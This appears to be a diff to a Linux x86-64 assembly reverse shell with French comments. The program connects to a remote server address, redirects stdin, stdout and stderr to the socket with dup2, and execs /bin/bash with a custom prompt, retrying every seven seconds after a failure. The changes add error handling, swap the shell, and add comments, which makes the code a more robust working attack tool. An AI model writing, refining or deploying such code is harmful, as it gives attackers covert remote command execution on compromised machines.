@@ -33,7 +33,7 @@ section .data
         sock_init_msg db ">> Socket initialisation....", 0x0A
         sock_init_msg_len equ $ - sock_init_msg
 
-        socket_err_msg db ">> /!\Socket initialisation error/!\", 0x0A
+        socket_err_msg db ">> /!\Waiting for socket/!\", 0x0A
         socket_err_msg_len equ $ - socket_err_msg
 
         bind_err_msg db ">> /!\failed bind socket/!\", 0x0A
@@ -48,20 +48,25 @@ section .data
         create_shll_err_msg db "failed to create shell", 0x0A
         create_shll_msg_err_len equ $ - create_shll_err_msg
 
-        create_shll_msg db ">> Waiting shell to create....", 0x0A
+        create_shll_msg db ">> Shell successful", 0x0A
         create_shll_msg_len equ $ - create_shll_msg  
 
         shll_success_msg db ">> Shell created ! ", 0x0A
         shll_success_msg_len equ $ - shll_success_msg
+
+        skt_err_msg db ">> /!\Socket creation failed/!\", 0x0A
+        skt_err_msg_len equ $ - skt_err_msg
 
     timespec:
         dq 7 ;rewind toute les 7 sec
         dq 0         
     
     shell:
-        db "/bin/sh", 0
-        argv dq shell, 0
-        env dq 0
+        db "/bin/bash", 0
+    argv dq shell, 0
+    prompt_ps1 db "PS1=>> ", 0 ;personnaliser le prompt
+    env dq prompt_ps1, 0 ;liste des variables d'environnement
+
 
 section .bss
     sockfd resq 1
@@ -70,60 +75,66 @@ section .text
 
 _start:
 .connection:  
-
-
+    ;initialisation du socket msg
     mov rdi, 2
     mov rsi, sock_init_msg
     mov rdx, sock_init_msg_len
     call write 
 
-    ;socket creation
+    ;socket creation via AF_INET SOCK STRAM 0
     mov rax, 41
     mov rdi, 2
     mov rsi, 1
     mov rdx, 0
     syscall
+    test rax, rax
+    js .skt_err_msg ;si erreur alors sleep
     mov [sockfd], rax ;stock socket fd
 
 
-    ;tentative de connection
-    mov rdi, rax
-    lea rsi, [rel sockaddr]
-    mov rdx, 16
-    mov rax, 42
+    ;tentative de connection au serveur
+    mov rdi, rax ;lit le fd du socket
+    lea rsi, [rel sockaddr] ;adresse du serveur
+    mov rdx, 16 ;taille de la structure sockaddr
+    mov rax, 42 ;syscall numb
     syscall
     test rax, rax
     js .connect_err ;si erreur alors sleep
 
+    ; msg de test connexion
     mov rdi, 2
     mov rsi, conn_test_msg
     mov rdx, conn_test_msg_len
     call write
 
+    ;msg de succes de connection
     mov rdi, 2
     mov rsi, conn_success_msg
     mov rdx, conn_success_msg_len
     call write
 
-
+    ;msg de creation shell
     mov rdi, 2
     mov rsi, create_shll_msg
     mov rdx, create_shll_msg_len
     call write
 
-    mov rsi, 0
+    mov rsi, 0 ;initialisation du compteur de redirection
+    
 .redirection:
     mov rdi, [sockfd]
     call dup2 ; duplication du fd
+    test rax, rax
+    js .bind_err ;si erreur alors sleep
     inc rsi
     cmp rsi, 3
     jne .redirection ;si erreur redirection
  
 
     ;creation reverse shell
-    lea rdi, [rel shell]
-    lea rsi, [rel argv]
-    lea rdx, [rel env]
+    lea rdi, [rel shell] ;chemin du shell
+    lea rsi, [rel argv] ;arguments du shell
+    lea rdx, [rel env] ;variables d'environnement
     call execve
     jmp .error_shell_err
     ;si erreur alors sleep
@@ -149,7 +160,13 @@ _start:
     mov rdx, bind_err_msg_len
     call write  
     jmp .sleep
-
+    
+.skt_err_msg:
+    mov rdi, 2
+    mov rsi, skt_err_msg
+    mov rdx, skt_err_msg_len
+    call write  
+    jmp .sleep
     
 .sleep:
     lea rdi, [rel timespec]
